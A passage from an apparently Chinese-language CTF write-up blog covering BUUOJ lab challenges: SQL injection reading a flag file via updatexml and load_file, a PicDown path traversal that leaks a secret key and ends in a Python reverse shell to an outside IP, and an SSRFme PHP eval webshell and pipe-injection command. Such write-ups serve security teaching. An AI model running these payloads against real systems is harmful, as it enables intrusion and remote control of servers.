</span></span><span style=display:flex><span>        $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;no sql inject!&#39;</span>;
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;select * from `user` where `user_name`=&#39;</span><span style=color:#e6db74>{</span>$user_name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39; and `phone`=&#39;</span><span style=color:#e6db74>{</span>$phone<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span><span style=display:flex><span>        $fetch <span style=color:#f92672>=</span> $db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($fetch) <span style=color:#f92672>&amp;&amp;</span> $fetch<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>num_rows</span><span style=color:#f92672>&gt;</span><span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>        $row <span style=color:#f92672>=</span> $fetch<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch_assoc</span>();
</span></span><span style=display:flex><span>        $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;update `user` set `address`=&#39;&#34;</span><span style=color:#f92672>.</span>$address<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&#39;, `old_address`=&#39;&#34;</span><span style=color:#f92672>.</span>$row[<span style=color:#e6db74>&#39;address&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&#39; where `user_id`=&#34;</span><span style=color:#f92672>.</span>$row[<span style=color:#e6db74>&#39;user_id&#39;</span>];
</span></span><span style=display:flex><span>        $result <span style=color:#f92672>=</span> $db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$result) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;error&#39;</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>print_r</span>($db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>error</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;è®¢å•ä¿®æ”¹æˆåŠŸ&#34;</span>;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;æœªæ‰¾åˆ°è®¢å•!&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ä¿¡æ¯ä¸å…¨&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>#del
</span></span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span> <span style=color:#e6db74>&#34;config.php&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#34;user_name&#34;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#34;phone&#34;</span>]))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    $pattern <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span>;
</span></span><span style=display:flex><span>    $user_name <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#34;user_name&#34;</span>];
</span></span><span style=display:flex><span>    $phone <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#34;phone&#34;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>($pattern,$user_name) <span style=color:#f92672>||</span> <span style=color:#a6e22e>preg_match</span>($pattern,$phone)){ 
</span></span><span style=display:flex><span>        $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;no sql inject!&#39;</span>;
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;select * from `user` where `user_name`=&#39;</span><span style=color:#e6db74>{</span>$user_name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39; and `phone`=&#39;</span><span style=color:#e6db74>{</span>$phone<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span><span style=display:flex><span>        $fetch <span style=color:#f92672>=</span> $db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($fetch) <span style=color:#f92672>&amp;&amp;</span> $fetch<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>num_rows</span><span style=color:#f92672>&gt;</span><span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>        $row <span style=color:#f92672>=</span> $fetch<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch_assoc</span>();
</span></span><span style=display:flex><span>        $result <span style=color:#f92672>=</span> $db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>(<span style=color:#e6db74>&#39;delete from `user` where `user_id`=&#39;</span> <span style=color:#f92672>.</span> $row[<span style=color:#e6db74>&#34;user_id&#34;</span>]);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$result) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;error&#39;</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>print_r</span>($db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>error</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;è®¢å•åˆ é™¤æˆåŠŸ&#34;</span>;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;æœªæ‰¾åˆ°è®¢å•!&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ä¿¡æ¯ä¸å…¨&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>#config
</span></span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ini_set</span>(<span style=color:#e6db74>&#34;open_basedir&#34;</span>, <span style=color:#a6e22e>getcwd</span>() <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;:/etc:/tmp&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$DATABASE <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;host&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;username&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;root&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;root&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;dbname&#34;</span> <span style=color:#f92672>=&gt;</span><span style=color:#e6db74>&#34;ctfusers&#34;</span>
</span></span><span style=display:flex><span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$db <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>mysqli</span>($DATABASE[<span style=color:#e6db74>&#39;host&#39;</span>],$DATABASE[<span style=color:#e6db74>&#39;username&#39;</span>],$DATABASE[<span style=color:#e6db74>&#39;password&#39;</span>],$DATABASE[<span style=color:#e6db74>&#39;dbname&#39;</span>]);
</span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°åªæœ‰change.phpé‡Œçš„addressåªæ˜¯ç”¨addslashesè¿›è¡Œé™åˆ¶</p><p><code>addslashes</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œç”¨äºåœ¨ç‰¹å®šå­—ç¬¦å‰æ·»åŠ åæ–œæ ï¼ˆ<code>\</code>ï¼‰ï¼Œä»¥ä¾¿åœ¨æ•°æ®åº“æŸ¥è¯¢ç­‰åœºæ™¯ä¸­é¿å…æ½œåœ¨çš„å®‰å…¨é—®é¢˜æˆ–è¯­æ³•é”™è¯¯ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;</span><span style=color:#f92672>/</span>flag.txt<span style=color:#e6db74>&#39;),1,30)),0x7e),1)#
</span></span></span></code></pre></div><pre tabindex=0><code>flag{90347b28-637f-4b06-a46d-1
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;</span><span style=color:#f92672>/</span>flag.txt<span style=color:#e6db74>&#39;),30,30)),0x7e),1)#
</span></span></span></code></pre></div><pre tabindex=0><code>105d9e603d02}
</code></pre><pre tabindex=0><code>flag{90347b28-637f-4b06-a46d-105d9e603d02}
</code></pre><h2 id=ç½‘é¼æ¯-2020-ç™½è™ç»„picdown>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h2><h3 id=éé¢„æœŸ>éé¢„æœŸ</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /page?url<span style=color:#f92672>=</span>../../../../flag  HTTP/1.1
</span></span><span style=display:flex><span>Host: 7ee71ebf-668c-4a77-989a-794c12ad7271.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>referer: http://7ee71ebf-668c-4a77-989a-794c12ad7271.node5.buuoj.cn:81/
</span></span><span style=display:flex><span>Connection: close
</span></span></code></pre></div><h3 id=é¢„æœŸ>é¢„æœŸ</h3><pre tabindex=0><code>/page?url=/proc/self/environ
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>MAIL<span style=color:#f92672>=</span>/var/mail/app USER<span style=color:#f92672>=</span>app HOME<span style=color:#f92672>=</span>/home/app LOGNAME<span style=color:#f92672>=</span>app PATH<span style=color:#f92672>=</span>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games SHELL<span style=color:#f92672>=</span>/bin/sh PWD<span style=color:#f92672>=</span>/app 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/proc/self/cmdline
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>python2 app.py
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /page?url<span style=color:#f92672>=</span>app.py 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, Response
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> render_template
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> request
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SECRET_FILE <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/tmp/secret.txt&#34;</span>
</span></span><span style=display:flex><span>f <span style=color:#f92672>=</span> open(SECRET_FILE)
</span></span><span style=display:flex><span>SECRET_KEY <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>remove(SECRET_FILE)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;search.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/page&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>page</span>():
</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;url&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> url<span style=color:#f92672>.</span>lower()<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;file&#34;</span>):
</span></span><span style=display:flex><span>            res <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>urlopen(url)
</span></span><span style=display:flex><span>            value <span style=color:#f92672>=</span> res<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> Response(value, mimetype<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;application/octet-stream&#39;</span>)
</span></span><span style=display:flex><span>            response<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Content-Disposition&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;attachment; filename=beautiful.jpg&#39;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> response
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;HACK ERROR!&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SOMETHING WRONG!&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;search.html&#39;</span>, res<span style=color:#f92672>=</span>value)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/no_one_know_the_manager&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>manager</span>():
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;key&#34;</span>)
</span></span><span style=display:flex><span>    print(SECRET_KEY)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> key <span style=color:#f92672>==</span> SECRET_KEY:
</span></span><span style=display:flex><span>        shell <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;shell&#34;</span>)
</span></span><span style=display:flex><span>        os<span style=color:#f92672>.</span>system(shell)
</span></span><span style=display:flex><span>        res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ok&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Wrong Key!&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>8080</span>)
</span></span></code></pre></div><p>åœ¨ Linux ä¸­ï¼Œå½“ä¸€ä¸ªæ–‡ä»¶è¢«åˆ é™¤æ—¶ï¼Œå¦‚æœä»æœ‰è¿›ç¨‹æŒæœ‰è¯¥æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæ–‡ä»¶çš„å†…å®¹å¹¶ä¸ä¼šç«‹å³ä»ç£ç›˜ä¸­æ¸…é™¤ï¼Œè€Œæ˜¯ä¼šä¸€ç›´ä¿ç•™ï¼Œç›´åˆ°æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦éƒ½è¢«å…³é—­</p><p>æœªå…³é—­çš„æ–‡ä»¶æè¿°ç¬¦å¯ä»¥é€šè¿‡ <code>/proc/self/fd/xxx</code> è®¿é—®</p><pre tabindex=0><code>/page?url=/proc/self/fd/3 
80oP3TCZ/Tchr8y1LoRjb9uzOD6f4wV8d1/r4yWCNmw=
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>http:<span style=color:#f92672>//</span><span style=color:#ae81ff>7</span>ee71ebf<span style=color:#f92672>-</span><span style=color:#ae81ff>668</span>c<span style=color:#f92672>-</span><span style=color:#ae81ff>4</span>a77<span style=color:#f92672>-</span><span style=color:#ae81ff>989</span>a<span style=color:#f92672>-</span><span style=color:#ae81ff>794</span>c12ad7271<span style=color:#f92672>.</span>node5<span style=color:#f92672>.</span>buuoj<span style=color:#f92672>.</span>cn:<span style=color:#ae81ff>81</span><span style=color:#f92672>/</span>no_one_know_the_manager<span style=color:#960050;background-color:#1e0010>?</span>key<span style=color:#f92672>=</span><span style=color:#ae81ff>80</span>oP3TCZ<span style=color:#f92672>/</span>Tchr8y1LoRjb9uzOD6f4wV8d1<span style=color:#f92672>/</span>r4yWCNmw<span style=color:#f92672>=&amp;</span>shell<span style=color:#f92672>=</span>python3 <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#39;import os,pty,socket;s=socket.socket();s.connect((&#34;47.83.222.208&#34;,5566));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;sh&#34;)&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@iZj6c98fw9nxbehefwon8jZ:~# nc -lvnp <span style=color:#ae81ff>5566</span>
</span></span><span style=display:flex><span>Listening on 0.0.0.0 <span style=color:#ae81ff>5566</span>
</span></span><span style=display:flex><span>Connection received on 117.21.200.176 <span style=color:#ae81ff>23136</span>
</span></span><span style=display:flex><span>$ ls
</span></span><span style=display:flex><span>ls
</span></span><span style=display:flex><span>app.py  flag.sh  requirements.txt  templates
</span></span><span style=display:flex><span>$ ls /
</span></span><span style=display:flex><span>ls /
</span></span><span style=display:flex><span>app  boot  etc   flag.sh  lib    media  opt   root  sbin  start.sh  tmp  var
</span></span><span style=display:flex><span>bin  dev   flag  home     lib64  mnt    proc  run   srv   sys       usr
</span></span><span style=display:flex><span>$ cat /flag
</span></span><span style=display:flex><span>cat /flag
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{</span>b2aab15f-f61b-470a-8082-5044b4f0c236<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>$ 
</span></span></code></pre></div><h2 id=hitcon-2017ssrfme>[HITCON 2017]SSRFme</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_SERVER[<span style=color:#e6db74>&#39;HTTP_X_FORWARDED_FOR&#39;</span>])) {
</span></span><span style=display:flex><span>        $http_x_headers <span style=color:#f92672>=</span> <span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#39;,&#39;</span>, $_SERVER[<span style=color:#e6db74>&#39;HTTP_X_FORWARDED_FOR&#39;</span>]);
</span></span><span style=display:flex><span>        $_SERVER[<span style=color:#e6db74>&#39;REMOTE_ADDR&#39;</span>] <span style=color:#f92672>=</span> $http_x_headers[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> $_SERVER[<span style=color:#e6db74>&#34;REMOTE_ADDR&#34;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $sandbox <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;sandbox/&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>md5</span>(<span style=color:#e6db74>&#34;orange&#34;</span> <span style=color:#f92672>.</span> $_SERVER[<span style=color:#e6db74>&#34;REMOTE_ADDR&#34;</span>]);
</span></span><span style=display:flex><span>    <span style=color:#f92672>@</span><span style=color:#a6e22e>mkdir</span>($sandbox);
</span></span><span style=display:flex><span>    <span style=color:#f92672>@</span><span style=color:#a6e22e>chdir</span>($sandbox);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $data <span style=color:#f92672>=</span> <span style=color:#a6e22e>shell_exec</span>(<span style=color:#e6db74>&#34;GET &#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>escapeshellarg</span>($_GET[<span style=color:#e6db74>&#34;url&#34;</span>]));
</span></span><span style=display:flex><span>    $info <span style=color:#f92672>=</span> <span style=color:#a6e22e>pathinfo</span>($_GET[<span style=color:#e6db74>&#34;filename&#34;</span>]);
</span></span><span style=display:flex><span>    $dir  <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#34;.&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>basename</span>($info[<span style=color:#e6db74>&#34;dirname&#34;</span>]));
</span></span><span style=display:flex><span>    <span style=color:#f92672>@</span><span style=color:#a6e22e>mkdir</span>($dir);
</span></span><span style=display:flex><span>    <span style=color:#f92672>@</span><span style=color:#a6e22e>chdir</span>($dir);
</span></span><span style=display:flex><span>    <span style=color:#f92672>@</span><span style=color:#a6e22e>file_put_contents</span>(<span style=color:#a6e22e>basename</span>($info[<span style=color:#e6db74>&#34;basename&#34;</span>]), $data);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span></code></pre></div><pre tabindex=0><code>/sandbox/50d5f583d8a911dde39156ba3f03c3d5
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?url<span style=color:#f92672>=</span>/&amp;filename<span style=color:#f92672>=</span>upload/test.php
</span></span></code></pre></div><h3 id=æ–¹æ³•1>æ–¹æ³•1</h3><p>çœ‹ä¸€ä¸‹æ–‡ä»¶</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://8a8bdb62-9576-4abc-bf0a-1da4a5b751a8.node5.buuoj.cn:81/?url<span style=color:#f92672>=</span>data:text/plain,&lt;?php eval<span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span>1<span style=color:#f92672>])</span>;?&gt;&amp;filename<span style=color:#f92672>=</span>123.php
</span></span></code></pre></div><p>ç„¶åèšå‰‘è¿ä¸€ä¸‹æ‰§è¡Œ<code>./readflag</code>å°±è¡Œ</p><h3 id=æ–¹æ³•2>æ–¹æ³•2</h3><p>æ²¡æ‰“é€š</p><p>è¿è¡Œreadflagæ–‡ä»¶è¯»å–flag</p><p>ç”±äºéœ€æ»¡è¶³å‰é¢æ–‡ä»¶å­˜åœ¨,æ‰ä¼šæ‰§è¡Œopenè¯­å¥,æ‰€ä»¥å…ˆåˆ›å»ºåŒåæ–‡ä»¶ï¼Œperlæ‰§è¡Œå§</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?url<span style=color:#f92672>=</span>&amp;filename<span style=color:#f92672>=</span>|/readflag
</span></span><span style=display:flex><span>?url<span style=color:#f92672>=</span>file:|readflag&amp;filename<span style=color:#f92672>=</span><span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span>/sandbox/50d5f583d8a911dde39156ba3f03c3d5/123
</span></span></code></pre></div><h2 id=b01lers2020welcome-to-earth>[b01lers2020]Welcome to Earth</h2><p>æœ¬é¢˜å°±æ˜¯çœ‹view-source,è·Ÿç€é€’è¿›æœ€åæ¥åˆ°ä¸‹é¢ä»£ç çš„åœ°æ–¹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>// Run to scramble original flag
</span></span><span style=display:flex><span>//console.log(scramble(flag, action));
</span></span><span style=display:flex><span>function scramble(flag, key) {
</span></span><span style=display:flex><span>  for (var i = 0; i &lt; <span style=color:#f92672>key.length</span><span style=color:#960050;background-color:#1e0010>;</span> <span style=color:#a6e22e>i</span><span style=color:#960050;background-color:#1e0010>++)</span> <span style=color:#960050;background-color:#1e0010>{</span>
